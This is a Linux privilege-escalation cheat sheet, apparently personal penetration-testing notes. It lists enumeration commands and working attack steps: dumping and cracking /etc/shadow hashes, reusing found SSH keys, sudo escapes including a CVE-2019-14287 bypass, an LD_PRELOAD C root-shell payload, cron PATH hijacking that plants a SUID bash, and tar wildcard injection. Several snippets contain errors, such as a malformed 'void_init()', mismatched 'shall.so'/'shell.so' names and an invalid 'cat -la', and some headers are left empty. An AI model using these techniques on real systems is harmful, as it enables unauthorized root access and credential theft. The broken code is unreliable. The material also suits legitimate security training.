# Linux Privilege Escalation Cheat Sheet
## Initial Enumeration
### System Enumeration
  ```bash
  hostname
  uname -a
  cat /proc/version
  cat /etc/issue
  lscpu
  ```

### Process Enumeration
  ```bash
  ps aux
  ps aux | grep root
```

### User Enumeration
  ```bash
  whoami
  id
  sudo -l
  cat /etc/passwd
  cat /etc/passwd | cut -d : -f 1
  cat /etc/shadow
  cat /etc/group
  ```
  ```bash
  history
  ```

### Network Enumeration
  ```bash
  ifconfig
  ip a
  ip route
  arp -a
  ip neigh
  ```
  ```bash
  netstat -ano
  ```

## Kernel Exploit
### Kernel Exploit Enumeration
#### Check System Information
  ```bash
  hostname
  uname -a
  cat /etc/lsb-release
  cat /proc/version
  cat /etc/os-release
  cat /etc/issue
  lscpu
  ```

#### Check Running Process Information
  ```bash
  ps aux
  ps aux | grep root
  ```

### Kernel Exploitation Process
  1. Google for Exploits against the OS and Kernel Version 
  2. Download, compile, and run it against the target if it exists
  3. Try something else if it does not exist.

## Escalation via Password & File Permissions
### Stored Password
  A password may be stored in the bash history
  ```bash
  history
  ```
  Or in the files 
  ```bash
  grep --color=auto -rnw '/' -ie "PASSW" --color=always 2> /dev/null
  find . -type f -exec grep -i -I "PASSW" {} /dev/null \;
  ```

### Weak File Permissions
  1. Verify File Permissions
  ```bash
  ls -la /etc/passwd
  ls -la /etc/shadow
  ```
  2. Copy the content of these files
  ```bash
  cat -la /etc/passwd
  cat -la /etc/shadow
  ```
  ```bash
  unshadow <passwd_File> <shadow_file>
  ```
  3. Identify the hash
  ```web
  https://hashcat.net/wiki/doku.php?id=example_hashes
  ```
  4. Crack the Hash with hashcat
  ```powershell
  .\hashcat64.exe -m <hash_typw> <unshadowed_file> .\rockyou.txt -O
  ```
  5. PROFIT!

### SSH Keys
  1.FInd SSH Keys
  ```bash
  find / -name authorized_keys 2> /dev/null
  find / -name id_rsa 2> /dev/null
  ```
  2. Download the SSH key
  3. Change the permissions on the key 
  ```bash
  chmod 600 id_rsa
  ```
  4. Attempt the key
  ```bash
  ssh -i id_rsa <user>@<ip>
  ```
  5. PROFIT!

## Escalation via Sudo
### Sudo Shell Escaping
  1. Look for root NOPASSWORD
  ```bash
  sudo -l
  ```
  2. Check GTFOBins for the binary with sudo
  ```url
  https://gtfobins.github.io/
  ```
  3. Run the command found.
  4. PROFIT!

### Intended Functionality
  1. check what you can run as root
  ```bash
  sudo -l
  ```
  3. Research GTFOBins for the binary
  4. If nothing is found search for <binary> root privilege escalation
  
### LD_PRELOAD
  1. Identify LD_Preload with
  ```bash
  sudo -l
  ```
  2. Generate the following file: Shell.c
  ```C
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>
  
  void_init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
  }  
  ```
  3. Compile the file:
  ```bash
  gcc -fPIC -shared -o shall.so shell.c -nostartfiles
  ```
  4. Execute the attack
  ```bash
  sudo LD_PRELOAD=<Path/to/>shell.so <binary we can run as sudo>
  ```
  5. ROOT!

### CVE-2019-14287
  1. Run sudo -l
  ```bash
  sudo -l
  ```
  2. Check that you see: (ALL, !root) NOPASSWD: /bin/bash
  3. Attempt the attack
  ```bash
  sudo -u#-1 /bin/bash
  ```
  4 ROOT!
  
###
## Escalation via SUID
## Escalation via Scheduled Tasks
### Check writeable Files and Directories
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
Pay particulalar attention to the following locations
  * /etc/init.d
  * /etc/cron*
  * /etc/crontab
  * /etc/cron.allow
  * /etc/cron.d 
  * /etc/cron.deny
  * /etc/cron.daily
  * /etc/cron.hourly
  * /etc/cron.monthly
  * /etc/cron.weekly
  * /etc/sudoers
  * /etc/exports
  * /etc/anacrontab
  * /var/spool/cron
  * /var/spool/cron/crontabs/root

### Enumerate Scheduled Tasks By checking the scheduled tasks
```bash
crontab -l
ls -lah /var/spool/cron
ls -lah /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
systemctl list-timers --all
```
### Escalation via Cron Paths
  1. Check the PATH= Variable.
  2. Check what files are being run.
  3. Check if the file exists in the file path from left to right.
      * If it does not exist, check if you can write the file


           i. Create The File With:
           
            echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <path>/<file>
            chmod +x <path><file>
        
           ii. Escalate Privilege
         
            /tmp/bash

      * If the file exists before you find a writeable location, try something else.

### Escalation via Wildcards
If a command accepts wildcards as an argument and it is present in the crontab or cronjob do the following:
1. Research the executable
2. Create files where the name of the file if fed as part of the argument
3. The executable will interpret the name of the file as part of the command
4. Profit

Tar is a good example of this with the payloads
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > root.sh
chmod +x root.sh
```
```bash
--checkpoint=1
--checkpoint-action=exec=sh root,sh
```

## Check OS version
## Check Kernel Version

## List current running processes
Look for processes running as root. A misconfigured or vulnerable running as run can be an easy win.
ps aux | grep root
List current processes
ps au

## List the contents of the Home Directory
 
 ls /home
 
## List the contents of a users home directory
 
 ls -lah /home/<user>

## Check and retrieve the content of the SSH Directory

  These can be used to access other systems within the environment
  ls -lah /home/<user>/.ssh
  
## Check the Bash HIstory
  history
  
## List a users sudo privileges
  sudo -l
  
## Check the content of /etc/passwd
  cat /etc/passwd
  
## Check the Content of /etc/cron*
  ls /etc/cron.*
  cat /etc/cron*/<cronjob>
  
## kust File Systems and Additional Drives
  lsblk
  
## Find Writeable Directories
  find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

## Find writeable files
  find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
  
#
